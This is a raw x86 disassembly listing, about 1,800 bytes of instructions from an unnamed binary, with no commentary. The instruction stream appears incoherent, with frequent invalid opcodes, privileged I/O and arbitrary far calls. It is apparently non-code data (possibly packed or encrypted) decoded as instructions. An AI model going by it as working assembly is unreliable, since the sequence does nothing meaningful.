  4174db:	(bad)  [ecx+0x1f52552a]
  4174e1:	sbb    bh,BYTE PTR [esi+ecx*1-0x12]
  4174e5:	or     al,0xfd
  4174e7:	xor    edx,0xd08925c5
  4174ed:	sbb    eax,0x626c13b1
  4174f2:	stos   BYTE PTR es:[edi],al
  4174f3:	test   eax,0xbcfc7c06
  4174f8:	push   ebx
  4174f9:	or     DWORD PTR [edi+0x50b35fda],ebp
  4174ff:	and    DWORD PTR [esi-0x1a],edx
  417502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417503:	xor    al,0xc5
  417505:	mov    al,0x16
  417507:	jp     0x4174d9
  417509:	dec    esi
  41750a:	sub    BYTE PTR [eax],ah
  41750c:	test   BYTE PTR [esi-0x67],dl
  41750f:	int3   
  417510:	mov    ebp,0x6cd00f04
  417515:	das    
  417516:	mov    fs,WORD PTR [ecx+0x75]
  417519:	push   ebp
  41751a:	pop    ecx
  41751b:	popf   
  41751c:	fcomp  DWORD PTR [ebx-0x257bdcef]
  417522:	or     DWORD PTR [edi+0x7154bdef],ecx
  417528:	pop    ebx
  417529:	cwde   
  41752a:	sahf   
  41752b:	pop    edi
  41752c:	pop    ecx
  41752d:	cmp    edi,DWORD PTR [edx+0x36]
  417530:	stos   DWORD PTR es:[edi],eax
  417531:	loop   0x41755a
  417533:	rcl    cl,0xb
  417536:	in     al,0x12
  417538:	pop    eax
  417539:	sub    DWORD PTR [ecx+0x241dded4],eax
  41753f:	icebp  
  417540:	mov    dl,0x43
  417542:	and    BYTE PTR [ecx+0x6],bh
  417545:	(bad)  
  417546:	stc    
  417547:	test   cl,dh
  417549:	clc    
  41754a:	xchg   ebp,eax
  41754b:	and    DWORD PTR [eax+0x332eca3d],ebx
  417551:	jecxz  0x4175a3
  417553:	fwait
  417554:	pop    ebp
  417555:	(bad)  
  417556:	push   ecx
  417557:	out    0x0,eax
  417559:	sub    ch,BYTE PTR [edi-0x3f]
  41755c:	daa    
  41755d:	sub    eax,0xcab70682
  417562:	or     al,0x5
  417564:	test   eax,0x108b4b40
  417569:	mov    eax,gs
  41756b:	(bad)  
  41756c:	sub    edx,DWORD PTR [eax]
  41756e:	inc    esp
  41756f:	mov    eax,ds:0x6599b614
  417574:	cmp    cl,ch
  417576:	cdq    
  417577:	and    BYTE PTR [edi-0x75],0xa1
  41757b:	dec    ecx
  41757c:	fsubp  st(7),st
  41757e:	(bad)  
  41757f:	pop    ss
  417580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417581:	shl    DWORD PTR [edx-0x4b],1
  417584:	cmp    DWORD PTR [ecx+edi*8-0x3a9d865d],0x5721b71f
  41758f:	fmul   DWORD PTR [ebp-0x58b210bc]
  417595:	int3   
  417596:	adc    al,0x6b
  417598:	push   eax
  417599:	jecxz  0x4175aa
  41759b:	sbb    BYTE PTR [eax+eax*8-0x31],cl
  41759f:	cmp    eax,0x80bc512b
  4175a4:	in     eax,0xed
  4175a6:	hlt    
  4175a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175a8:	call   0x6c0f:0x748cc91f
  4175af:	int    0xd3
  4175b1:	pushf  
  4175b2:	sbb    cl,BYTE PTR [edi]
  4175b4:	imul   BYTE PTR ss:[edi-0x1c1b7594]
  4175bb:	adc    edi,DWORD PTR [esi+0x6386c7e2]
  4175c1:	xchg   BYTE PTR [eax+ebp*4],ch
  4175c4:	pop    esi
  4175c5:	add    DWORD PTR [ebp+0x2390bd10],ebp
  4175cb:	jns    0x417553
  4175cd:	and    dh,BYTE PTR [eax+0x52]
  4175d0:	je     0x4175a9
  4175d2:	fnstenv fs:[esi-0xc]
  4175d6:	pop    esp
  4175d7:	inc    esp
  4175d8:	sub    bl,bl
  4175da:	popa   
  4175db:	add    al,0xa7
  4175dd:	xchg   esp,eax
  4175de:	xchg   esi,eax
  4175df:	sahf   
  4175e0:	and    DWORD PTR [esi],0xffffffdf
  4175e3:	jge    0x417588
  4175e5:	test   al,0x22
  4175e7:	stos   DWORD PTR es:[edi],eax
  4175e8:	mov    ebp,0xa2079c13
  4175ed:	call   DWORD PTR [ebx+0x30]
  4175f0:	adc    ebx,DWORD PTR [ebp+edx*1+0x42]
  4175f4:	cli    
  4175f5:	dec    esp
  4175f6:	(bad)  
  4175f7:	xchg   ebp,eax
  4175f8:	out    dx,al
  4175f9:	outs   dx,BYTE PTR ds:[esi]
  4175fa:	fs out 0x37,al
  4175fd:	xchg   esi,eax
  4175fe:	std    
  4175ff:	mov    ds:0x21a36780,eax
  417604:	sbb    edi,DWORD PTR [esi]
  417606:	nop
  417607:	or     DWORD PTR [esi],ecx
  417609:	int    0x6b
  41760b:	loopne 0x4175ed
  41760d:	lods   eax,DWORD PTR ds:[esi]
  41760e:	ins    DWORD PTR es:[edi],dx
  41760f:	add    dl,BYTE PTR [ebp-0x56]
  417612:	out    0xf0,al
  417614:	pop    edi
  417615:	sbb    BYTE PTR [ecx+edi*4],cl
  417618:	cli    
  417619:	retf   0x1e94
  41761c:	xchg   edx,eax
  41761d:	jb     0x41765e
  41761f:	leave  
  417620:	pop    edi
  417621:	mov    eax,es
  417623:	dec    edi
  417624:	xor    DWORD PTR [edi+0x4b],0x6d6c96a1
  41762b:	pop    ds
  41762c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41762d:	inc    ebx
  41762e:	jp     0x417624
  417630:	lea    esi,[edi+0xb4cdcf5]
  417636:	jbe    0x41764f
  417638:	hlt    
  417639:	aas    
  41763a:	(bad)  
  41763b:	sbb    al,0x87
  41763d:	xor    al,0xdf
  41763f:	loopne 0x417691
  417641:	fisubr DWORD PTR [eax+0x717ab654]
  417647:	rol    DWORD PTR [ebp-0x78c35164],0xa4
  41764e:	lods   eax,DWORD PTR ds:[esi]
  41764f:	pop    DWORD PTR [edx+0x578204f5]
  417655:	xor    ecx,0x3c869233
  41765b:	aam    0xab
  41765d:	sub    dl,dh
  41765f:	mov    eax,ds:0xa51d1b8b
  417664:	xchg   DWORD PTR [eax+0x18],ebx
  417667:	dec    ebx
  417668:	je     0x41762d
  41766a:	pusha  
  41766b:	adc    ah,BYTE PTR [esi]
  41766d:	popf   
  41766e:	stos   DWORD PTR es:[edi],eax
  41766f:	imul   ebx,DWORD PTR [eax+eiz*8-0x5f445206],0x42a52d
  41767a:	sbb    DWORD PTR [ecx+0x2b],esi
  41767d:	sbb    al,0x69
  41767f:	ins    DWORD PTR es:[edi],dx
  417680:	mov    cl,0xda
  417682:	jb     0x417611
  417684:	mov    eax,0xaaea3ac4
  417689:	int    0xd4
  41768b:	jns    0x41765f
  41768d:	enter  0x1fe,0x6f
  417691:	xchg   esi,eax
  417692:	fcom   QWORD PTR [ecx+ebp*8-0x5745148e]
  417699:	add    eax,0xe9c51d6a
  41769e:	idiv   DWORD PTR [esi+ebp*4-0x1d090cca]
  4176a5:	pop    ebx
  4176a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176a7:	cmp    DWORD PTR [edx-0x75],esi
  4176aa:	adc    DWORD PTR [ebx-0x3d2971f0],edx
  4176b0:	mov    esi,0xae6f4982
  4176b5:	cld    
  4176b6:	test   al,0x1c
  4176b8:	xor    eax,0x8f45de6d
  4176bd:	jno    0x41771f
  4176bf:	lds    ecx,FWORD PTR [ebx-0x1a03cfd2]
  4176c5:	sar    BYTE PTR [edx+0x3],1
  4176c8:	mov    bl,0x18
  4176ca:	int    0x40
  4176cc:	psubq  mm6,QWORD PTR [edx+0x4efb6e49]
  4176d3:	jae    0x41772d
  4176d5:	clc    
  4176d6:	xchg   edi,eax
  4176d7:	xchg   BYTE PTR [eax-0x4],cl
  4176da:	xlat   BYTE PTR ds:[ebx]
  4176db:	pop    eax
  4176dc:	sahf   
  4176dd:	out    0xc9,al
  4176df:	mov    ecx,0xe3312b89
  4176e4:	cmp    eax,0x4ba98463
  4176e9:	dec    ebp
  4176ea:	retf   
  4176eb:	or     al,0x4a
  4176ed:	sbb    eax,0xd2c17729
  4176f2:	push   ds
  4176f3:	jmp    0x41772e
  4176f5:	nop
  4176f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176f7:	adc    BYTE PTR [ecx+0x4b6eee73],dh
  4176fd:	sbb    DWORD PTR [ebx-0x61cbc9bb],esi
  417703:	or     ebx,DWORD PTR [esi-0x8b34bf6]
  417709:	inc    ebx
  41770a:	add    al,0xa5
  41770c:	mov    dl,0xf5
  41770e:	or     ecx,DWORD PTR [edx-0x2b]
  417711:	mov    bl,0xbc
  417713:	xchg   esp,eax
  417714:	push   ebp
  417715:	(bad)  
  417716:	sub    ah,ah
  417718:	mov    ch,0x4d
  41771a:	ins    DWORD PTR es:[edi],dx
  41771b:	mov    dl,0x2d
  41771d:	mov    bl,0xa7
  41771f:	hlt    
  417720:	inc    ebx
  417721:	xchg   esi,eax
  417722:	fsubr  DWORD PTR [edx-0xb]
  417725:	sbb    al,0x83
  417727:	jno    0x417767
  417729:	lahf   
  41772a:	sbb    al,BYTE PTR [ecx]
  41772c:	or     eax,0xa0b910b7
  417731:	sub    al,0x2
  417733:	dec    esi
  417734:	inc    esi
  417735:	add    al,0xb0
  417737:	pop    DWORD PTR [ecx+ebp*1+0x0]
  41773b:	mov    dl,0x90
  41773d:	nop
  41773e:	pop    ss
  41773f:	push   0x2f64682c
  417744:	mov    ds,WORD PTR [esi+0x50c4dd3b]
  41774a:	add    edx,DWORD PTR [eax-0x4e]
  41774d:	sub    bl,BYTE PTR [ebx-0x3e02c6c2]
  417753:	stos   BYTE PTR es:[edi],al
  417754:	sub    DWORD PTR [ebx+0x7],edi
  417757:	push   ebp
  417758:	ins    DWORD PTR es:[edi],dx
  417759:	rol    BYTE PTR [edi-0x27],1
  41775c:	ror    BYTE PTR [esp+edx*2+0x54f0ffc4],0x4b
  417764:	cmp    ah,al
  417766:	dec    edi
  417767:	into   
  417768:	pop    esi
  417769:	imul   esp,edx,0xca4eeb71
  41776f:	(bad)  
  417770:	and    dh,BYTE PTR [esi+0x5915b9b2]
  417776:	sbb    DWORD PTR [esi],esi
  417778:	imul   edx
  41777a:	jp     0x417776
  41777c:	scas   eax,DWORD PTR es:[edi]
  41777d:	jmp    0x41779a
  41777f:	push   esi
  417780:	mov    esi,0x5a21136f
  417785:	and    esi,DWORD PTR [edi]
  417787:	ds pop ebp
  417789:	cwde   
  41778a:	(bad)  
  41778b:	call   0x121564e7
  417790:	add    eax,0xe1ab11a
  417795:	and    bh,ah
  417797:	lods   eax,DWORD PTR ds:[esi]
  417798:	xchg   ecx,eax
  417799:	jl     0x4177a8
  41779b:	inc    eax
  41779c:	jg     0x4177b3
  41779e:	cdq    
  41779f:	add    al,0xc7
  4177a1:	and    dl,BYTE PTR [ebx+0x59d6087e]
  4177a7:	pop    esi
  4177a8:	fbstp  TBYTE PTR [esi]
  4177aa:	mov    bh,0x7f
  4177ac:	mov    ch,0xce
  4177ae:	mov    bh,0x77
  4177b0:	mov    eax,ds:0xefa21bcb
  4177b6:	test   al,0x61
  4177b8:	dec    eax
  4177b9:	mov    bh,0x8a
  4177bb:	xchg   ebp,eax
  4177bc:	sbb    DWORD PTR [eax-0x42898ba6],edx
  4177c2:	ret    
  4177c3:	sahf   
  4177c4:	xchg   esp,eax
  4177c5:	mov    eax,0x416c6197
  4177ca:	mov    eax,0x9b368ab2
  4177cf:	sub    eax,0x1e91d2f0
  4177d4:	mov    WORD PTR [esi+0x31c5528d],gs
  4177da:	sub    DWORD PTR [edi-0x23],ecx
  4177dd:	add    bh,dh
  4177df:	adc    eax,0x6685e094
  4177e4:	test   eax,0xe116b1aa
  4177e9:	pop    edi
  4177ea:	sub    edx,ecx
  4177ec:	loope  0x417806
  4177ee:	loopne 0x417837
  4177f0:	fwait
  4177f1:	and    al,ch
  4177f3:	lea    ebp,[esi+0x3cb81e4e]
  4177f9:	or     edx,DWORD PTR [ecx+ebx*8+0x718edbf]
  417800:	push   es
  417801:	jnp    0x41778e
  417803:	mov    bl,BYTE PTR ds:0x466fa934
  417809:	loop   0x41785f
  41780b:	ss dec cx
  41780e:	inc    esp
  41780f:	fwait
  417810:	cmp    cl,BYTE PTR [ebx+0x9f41945]
  417816:	test   esp,eax
  417818:	mov    eax,ds:0x2b26a287
  41781d:	xchg   esp,eax
  41781e:	and    BYTE PTR [ebx],cl
  417820:	mov    ah,0x5d
  417822:	mov    eax,0xae10cbde
  417827:	fwait
  417828:	xor    BYTE PTR [edi+0x4239796f],dh
  41782e:	adc    ecx,DWORD PTR [esi]
  417830:	mov    ecx,0x18a2675f
  417835:	into   
  417836:	ret    
  417837:	mov    cs,WORD PTR [ebp-0x68]
  41783a:	ss (bad) 
  41783c:	repnz lods eax,DWORD PTR ds:[esi]
  41783e:	stos   BYTE PTR es:[edi],al
  41783f:	arpl   WORD PTR [edi],cx
  417841:	sub    edx,DWORD PTR [ebx+0x12b4e483]
  417847:	dec    ebx
  417848:	xchg   esp,eax
  417849:	xchg   ecx,eax
  41784a:	lods   eax,DWORD PTR ds:[esi]
  41784b:	or     BYTE PTR [esi],dl
  41784d:	hlt    
  41784e:	ror    DWORD PTR ds:0xd55c93a6,1
  417854:	add    ebx,ebp
  417856:	pop    eax
  417857:	mov    edi,0x89cf1c25
  41785c:	sbb    ebx,ecx
  41785e:	pop    edi
  41785f:	add    BYTE PTR [ecx-0x711ce666],bh
  417865:	(bad)  
  417866:	cmp    al,0x29
  417868:	mov    ch,0xc1
  41786a:	xor    BYTE PTR [ecx+0x2f],0xa0
  41786e:	and    ebx,ecx
  417870:	add    bh,ah
  417872:	ficomp WORD PTR [eax+0x64]
  417875:	leave  
  417876:	ficom  DWORD PTR [edx]
  417878:	sbb    esp,DWORD PTR [esi-0x26]
  41787b:	jp     0x41788a
  41787d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41787e:	pop    es
  41787f:	add    eax,0xae1b2331
  417884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417885:	aas    
  417886:	out    dx,al
  417887:	xor    al,0x15
  417889:	and    al,0x97
  41788b:	mov    ds:0xa1ad8024,eax
  417890:	dec    edx
  417891:	jp     0x4178ac
  417893:	call   0x5f44:0x739adbc5
  41789a:	popf   
  41789b:	adc    ebp,ebp
  41789d:	rcr    eax,1
  41789f:	ins    BYTE PTR es:[edi],dx
  4178a0:	into   
  4178a1:	add    eax,0x9141be7f
  4178a6:	push   esi
  4178a7:	scas   eax,DWORD PTR es:[edi]
  4178a8:	inc    ebp
  4178a9:	int    0x37
  4178ab:	int3   
  4178ac:	(bad)  
  4178ad:	out    dx,eax
  4178ae:	nop
  4178af:	je     0x4178c0
  4178b1:	mov    dh,0xd7
  4178b3:	mov    esi,0x4f9335ca
  4178b8:	push   DWORD PTR [edx+0x5c]
  4178bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178bc:	add    ah,BYTE PTR [edx+0x3d66e420]
  4178c2:	or     cl,BYTE PTR [edi+0x5330d689]
  4178c8:	ds cdq 
  4178ca:	lock fidivr WORD PTR [ebx+esi*4+0xa]
  4178cf:	int3   
  4178d0:	or     eax,0x49a8bb99
  4178d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178d6:	(bad)  
  4178d7:	mov    ch,0x4e
  4178d9:	call   0xd481:0x60935b2f
  4178e0:	rol    BYTE PTR [edi+0xe5281ef],cl
  4178e6:	and    eax,0x96ff4641
  4178eb:	sti    
  4178ec:	outs   dx,DWORD PTR ds:[esi]
  4178ed:	xchg   ebp,eax
  4178ee:	retf   0xb297
  4178f1:	mov    dh,dl
  4178f3:	(bad)  
  4178f4:	jl     0x41793c
  4178f6:	lahf   
  4178f7:	cmp    BYTE PTR [edi-0xb],cl
  4178fa:	clc    
  4178fb:	lods   al,BYTE PTR ds:[esi]
  4178fc:	fisttp WORD PTR [esi+ebx*4]
  4178ff:	(bad)  
  417900:	in     eax,0x4e
  417902:	and    eax,0x70d79d0f
  417907:	loopne 0x4178fe
  417909:	pushf  
  41790a:	push   0xbb554490
  41790f:	retf   0x72a9
  417912:	inc    eax
  417913:	nop
  417914:	sub    eax,0x46614a0b
  417919:	shr    ch,cl
  41791b:	stc    
  41791c:	pop    es
  41791d:	xchg   edi,eax
  41791e:	imul   edi,DWORD PTR ds:0x95c37a15,0x3cf7b9b7
  417928:	loop   0x417975
  41792a:	xor    DWORD PTR [ebp-0x48],ecx
  41792d:	call   0x552d:0xf5b94952
  417934:	pop    eax
  417935:	aas    
  417936:	xchg   BYTE PTR [edi],ch
  417938:	leave  
  417939:	icebp  
  41793a:	ja     0x417917
  41793c:	lea    ebx,[ebx-0x43]
  41793f:	jne    0x41791c
  417941:	mov    BYTE PTR [esi-0x6c],cl
  417944:	outs   dx,DWORD PTR ds:[esi]
  417945:	xchg   esi,eax
  417946:	pop    edx
  417947:	test   DWORD PTR [ecx+ebp*2+0x65],esi
  41794b:	and    al,0x42
  41794d:	mov    ah,BYTE PTR [ebp-0x1d]
  417950:	mov    edi,cs
  417952:	leave  
  417953:	repz pop eax
  417955:	outs   dx,BYTE PTR gs:[esi]
  417957:	movntq QWORD PTR [edx+edx*1-0x4d],mm2
  41795c:	push   ds
  41795d:	mov    ebp,0x611d4d52
  417962:	xchg   ebx,eax
  417963:	pop    es
  417964:	xor    eax,0xe3dcff9f
  417969:	test   BYTE PTR [edx-0x34d5eb1b],al
  41796f:	gs mov ebx,0x3d3530ca
  417975:	dec    eax
  417976:	jecxz  0x4179a8
  417978:	inc    ebx
  417979:	sbb    eax,0x67e1c42d
  41797e:	jae    0x417941
  417980:	aam    0x1f
  417982:	inc    eax
  417983:	jns    0x417914
  417985:	push   ss
  417986:	ss dec ebp
  417988:	outs   dx,BYTE PTR ds:[esi]
  417989:	and    BYTE PTR [edx-0x7302358b],dh
  41798f:	in     al,0xdd
  417991:	clc    
  417992:	dec    esp
  417993:	xchg   edx,eax
  417994:	scas   al,BYTE PTR es:[edi]
  417995:	pop    eax
  417996:	scas   eax,DWORD PTR es:[edi]
  417997:	daa    
  417998:	scas   al,BYTE PTR es:[edi]
  417999:	pop    ebx
  41799a:	in     eax,dx
  41799b:	sar    BYTE PTR [edi+0x58],0xe5
  41799f:	adc    eax,0xdfe153a9
  4179a4:	and    al,0xf4
  4179a6:	jns    0x4179da
  4179a8:	das    
  4179a9:	loop   0x417950
  4179ab:	dec    esi
  4179ac:	add    esi,DWORD PTR [ebx-0x403695d0]
  4179b2:	cmp    DWORD PTR [edi+eax*4-0x6],0x71
  4179b7:	push   esp
  4179b8:	push   ss
  4179b9:	mov    dl,0x58
  4179bb:	aam    0x3c
  4179bd:	repnz loop 0x4179a4
  4179c0:	rol    BYTE PTR [ebx+ebp*4+0x3f46d7bb],cl
  4179c7:	cld    
  4179c8:	or     ch,dl
  4179ca:	or     eax,0xf19bc618
  4179cf:	sub    eax,0xedbae318
  4179d4:	mov    eax,DWORD PTR [edi+0xc]
  4179d7:	inc    eax
  4179d8:	iret   
  4179d9:	stos   DWORD PTR es:[edi],eax
  4179da:	jp     0x417a29
  4179dc:	push   esi
  4179dd:	cmp    cl,BYTE PTR ss:[esi+0x1c]
  4179e1:	jns    0x4179bc
  4179e3:	jae    0x417a43
  4179e5:	addr16 (bad) 
  4179e7:	fs mov esi,0xb4cdcc8f
  4179ed:	inc    ecx
  4179ee:	cs jbe 0x4179c7
  4179f1:	add    esi,DWORD PTR [esi-0x5e]
  4179f4:	pop    es
  4179f5:	push   cs
  4179f6:	out    0x56,eax
  4179f8:	dec    eax
  4179f9:	cwde   
  4179fa:	sub    DWORD PTR [esi-0x31],ecx
  4179fd:	cmp    edi,ebp
  4179ff:	sub    eax,0x3ddda377
  417a04:	add    BYTE PTR [ecx+0x65],cl
  417a07:	dec    esp
  417a08:	shl    BYTE PTR [ebx+0x3ff4c646],0x91
  417a0f:	in     eax,0x7f
  417a11:	add    eax,0xa
  417a14:	push   ebp
  417a15:	and    edi,DWORD PTR [ebx]
  417a17:	es push es
  417a19:	aas    
  417a1a:	std    
  417a1b:	je     0x4179a9
  417a1d:	mov    ebp,DWORD PTR [edx-0x12]
  417a20:	lods   eax,DWORD PTR ds:[esi]
  417a21:	outs   dx,DWORD PTR ds:[esi]
  417a22:	add    DWORD PTR [ecx+esi*2+0x8],edi
  417a26:	mov    ebx,edi
  417a28:	(bad)  
  417a29:	jl     0x417a40
  417a2b:	xchg   DWORD PTR ds:0x726dce23,esp
  417a31:	or     al,0x90
  417a33:	(bad)  
  417a34:	ficom  WORD PTR [ebx-0x68ab0e1a]
  417a3a:	or     eax,0x50a9c933
  417a3f:	std    
  417a40:	es xchg esp,eax
  417a42:	or     eax,0xd810e518
  417a47:	sub    edx,esp
  417a49:	jne    0x417a91
  417a4b:	iret   
  417a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a4d:	arpl   ax,si
  417a4f:	std    
  417a50:	push   ss
  417a51:	stos   BYTE PTR es:[edi],al
  417a52:	es sbb eax,0x58f5fce9
  417a58:	shl    DWORD PTR [eax+0x43189d20],0xb8
  417a5f:	inc    DWORD PTR [ecx+0x17]
  417a62:	mov    DWORD PTR [ecx-0x2f],esp
  417a65:	aas    
  417a66:	xor    al,0x5
  417a68:	cld    
  417a69:	dec    esp
  417a6a:	and    BYTE PTR [eax],bl
  417a6c:	dec    ebp
  417a6d:	dec    edi
  417a6e:	aad    0x25
  417a70:	aas    
  417a71:	push   esp
  417a72:	jmp    0x417ab7
  417a74:	arpl   WORD PTR [edi-0x12438b0f],sp
  417a7a:	or     edi,ebp
  417a7c:	pushf  
  417a7d:	outs   dx,DWORD PTR ds:[esi]
  417a7e:	push   edx
  417a7f:	sub    eax,0x5d907f33
  417a84:	lods   eax,DWORD PTR ds:[esi]
  417a85:	repz fisttp DWORD PTR [esi-0x43]
  417a89:	(bad)  
  417a8a:	cmc    
  417a8b:	cmp    ebp,DWORD PTR ds:0xc4dbd118
  417a91:	mov    bh,0xe6
  417a93:	(bad)  
  417a94:	cli    
  417a95:	jl     0x417ad5
  417a97:	lock lock es dec ebp
  417a9b:	test   ecx,ecx
  417a9d:	(bad)  
  417a9f:	mov    ebx,DWORD PTR [eax-0x3bba0f56]
  417aa5:	ret    0xb73a
  417aa8:	add    al,0x3d
  417aaa:	retf   0x698b
  417aad:	outs   dx,BYTE PTR ds:[esi]
  417aae:	adc    cl,BYTE PTR ds:0x78bab97d
  417ab4:	jmp    FWORD PTR [edx+0x6e]
  417ab7:	mov    ah,0xa4
  417ab9:	sub    eax,0xf9c52b9c
  417abe:	aam    0x6e
  417ac0:	sub    ch,0x41
  417ac3:	imul   ebp,DWORD PTR [eax+0x470bcde7],0x3
  417aca:	ins    BYTE PTR es:[edi],dx
  417acb:	pop    ecx
  417acc:	inc    ebp
  417acd:	stos   DWORD PTR es:[edi],eax
  417ace:	cli    
  417acf:	or     DWORD PTR [esi-0x40],0xffffffbf
  417ad3:	push   DWORD PTR [esi+edi*8]
  417ad6:	mov    cl,0x74
  417ad8:	out    dx,al
  417ad9:	sub    bl,BYTE PTR [edx+0x74]
  417adc:	or     DWORD PTR [edx-0x53],edi
  417adf:	shl    BYTE PTR ds:0x4471dcf7,1
  417ae5:	scas   al,BYTE PTR es:[edi]
  417ae6:	jbe    0x417af3
  417ae8:	leave  
  417ae9:	sub    eax,0x59b7ceca
  417aee:	ins    DWORD PTR es:[edi],dx
  417aef:	fwait
  417af0:	or     eax,0x992f5489
  417af6:	mov    al,ds:0x54986c48
  417afb:	stc    
  417afc:	shl    BYTE PTR [edx+0x14550dfd],0x5f
  417b03:	call   DWORD PTR [ecx+0x7e]
  417b06:	jle    0x417b1d
  417b08:	repnz int3 
  417b0a:	inc    ebp
  417b0b:	pop    esi
  417b0c:	in     eax,dx
  417b0d:	les    esi,FWORD PTR [edx+edi*4]
  417b10:	scas   al,BYTE PTR es:[edi]
  417b11:	(bad)  
  417b13:	scas   al,BYTE PTR es:[edi]
  417b14:	xchg   esi,eax
  417b15:	outs   dx,DWORD PTR ds:[esi]
  417b16:	dec    edx
  417b17:	sub    BYTE PTR [edi+edx*2-0x7723b507],dl
  417b1e:	jg     0x417b61
  417b20:	jno    0x417b39
  417b22:	prefetch BYTE PTR ds:0xb14475b9
  417b29:	pop    ecx
  417b2a:	cdq    
  417b2b:	mov    ebx,0xa131da2d
  417b30:	nop
  417b31:	ins    BYTE PTR es:[edi],dx
  417b32:	mov    eax,ds:0x74b5c9d4
  417b37:	cmp    DWORD PTR [ecx],ebp
  417b39:	inc    ebp
  417b3a:	mov    eax,0x46b15f6b
  417b3f:	dec    esi
  417b40:	sub    cl,dl
  417b42:	or     ecx,DWORD PTR [eax+0x345e7b9a]
  417b48:	sub    esp,DWORD PTR [ebp+0x45]
  417b4b:	mov    ebx,eax
  417b4d:	and    ebp,DWORD PTR [esi+0x5edce162]
  417b53:	or     eax,0xe9fb6cd2
  417b58:	jge    0x417b48
  417b5a:	push   cs
  417b5b:	repnz fisubr DWORD PTR [ebp-0x17290bfa]
  417b62:	fwait
  417b63:	inc    esi
  417b64:	jns    0x417aea
  417b66:	inc    ebp
  417b67:	outs   dx,DWORD PTR ds:[esi]
  417b68:	int    0x46
  417b6a:	adc    al,0xba
  417b6c:	inc    eax
  417b6d:	mov    bh,0x14
  417b6f:	ficom  WORD PTR [ecx-0x20]
  417b72:	mov    BYTE PTR [ebx+0x4174f02a],ah
  417b78:	add    al,0xbe
  417b7a:	je     0x417b69
  417b7c:	sub    eax,0x3c091fed
  417b81:	scas   al,BYTE PTR es:[edi]
  417b82:	aam    0xb2
  417b84:	add    ebx,DWORD PTR [edx-0x22]
  417b87:	ret    0xab7d
  417b8a:	dec    ebx
  417b8b:	js     0x417b7f
  417b8d:	dec    esi
  417b8e:	fwait
  417b8f:	adc    al,0xa0
  417b91:	call   0x8cd1:0x587c82cd
  417b98:	xchg   ecx,eax
  417b99:	int3   
  417b9a:	push   cs
  417b9b:	(bad)  
  417b9d:	mov    edx,0x48baf051
  417ba2:	inc    edx
  417ba3:	loop   0x417b4b
  417ba5:	fs push edx
  417ba7:	lods   eax,DWORD PTR ds:[si]
  417ba9:	inc    edx
  417baa:	cmp    ebp,DWORD PTR [eax]
  417bac:	push   0x6e
  417bae:	test   DWORD PTR [eax+0x50],0xb0de1404
  417bb5:	ret    
  417bb6:	jl     0x417be8
  417bb8:	iret   
  417bb9:	test   al,0x1
  417bbb:	inc    edx
  417bbc:	mov    edx,0xa5521c90
  417bc1:	sub    DWORD PTR [ebp+ecx*8-0x63],ebx
  417bc5:	mov    esi,?
  417bc7:	add    eax,DWORD PTR [edx]
  417bc9:	into   
  417bca:	fwait
  417bcb:	or     eax,ebx
  417bcd:	lds    ebp,FWORD PTR [edi]
  417bcf:	adc    eax,0x7c35093d
  417bd4:	mov    esi,0x9ff5a31
  417bd9:	mov    ds:0xc9f86d08,eax
  417bde:	loop   0x417b96
  417be0:	sub    al,0x56
  417be2:	jge    0x417c47
  417be4:	lea    edx,[ecx+ebx*8-0x57]
  417be8:	scas   al,BYTE PTR es:[edi]
  417be9:	dec    esp
  417bea:	popf   
  417beb:	cld    
  417bec:	(bad)  [eax+0x7b86cb2c]
  417bf2:	xor    BYTE PTR [eax+edi*4],0x28
  417bf6:	jb     0x417be2
  417bf8:	xchg   ebx,eax
  417bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bfa:	adc    al,0x15
  417bfc:	daa    
  417bfd:	inc    edx
  417bfe:	mov    esp,0x33d56440
  417c03:	inc    edi
  417c04:	in     al,0x3a
  417c06:	js     0x417bb1
  417c08:	retf   0xe906
  417c0b:	cli    
  417c0c:	imul   edi,DWORD PTR [edx-0x6],0xe6a413a9
  417c13:	inc    esp
  417c14:	test   eax,0xa410071b
  417c19:	div    DWORD PTR [esi+edi*2]
  417c1c:	bound  ebx,QWORD PTR [eax-0x70c54ea4]
  417c22:	cmp    ah,BYTE PTR [ecx-0xf21a3e1]
  417c28:	call   0x80488d20
  417c2d:	dec    ecx
  417c2e:	mov    ds,esi
  417c30:	aam    0x36
  417c32:	jmp    0x37ef70e7
  417c37:	push   esp
  417c38:	cs enter 0x48af,0x38
  417c3d:	test   al,ch
  417c3f:	sub    bl,al
  417c41:	retf   
  417c42:	dec    ecx
  417c43:	lahf   
  417c44:	test   al,0x69
  417c46:	das    
  417c47:	push   0x7b
  417c49:	mov    ds:0xfe327a1b,al
  417c4e:	and    al,0x36
  417c50:	add    ah,BYTE PTR [edi]
  417c52:	sbb    bh,al
  417c54:	outs   dx,BYTE PTR ds:[esi]
  417c55:	ja     0x417c7e
  417c57:	aam    0x19
  417c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c5a:	dec    edi
  417c5b:	and    eax,0xb2d5c416
  417c60:	pop    edx
  417c61:	jnp    0x417c05
  417c63:	dec    esp
  417c64:	loope  0x417c40
  417c66:	sbb    DWORD PTR [ecx-0x4d],eax
  417c69:	ret    
  417c6a:	nop
  417c6b:	sub    eax,0x1ad6b2c6
  417c70:	mov    ebx,0xd73d9d27
  417c75:	daa    
  417c76:	out    0x59,eax
  417c78:	repz sbb ch,BYTE PTR [edx+0x65794e9a]
  417c7f:	push   ds
  417c80:	pop    esp
  417c81:	mov    WORD PTR [edx],?
  417c83:	pop    edx
  417c84:	adc    dh,BYTE PTR [ebp-0x7de9ea5f]
  417c8a:	mov    al,0x50
  417c8c:	inc    ecx
  417c8d:	out    dx,al
  417c8e:	loopne 0x417c49
  417c90:	dec    ebx
  417c91:	sub    BYTE PTR ds:0x3bd09e2d,0x32
  417c98:	push   ebx
  417c99:	inc    ebx
  417c9a:	cmp    eax,0xff340bb7
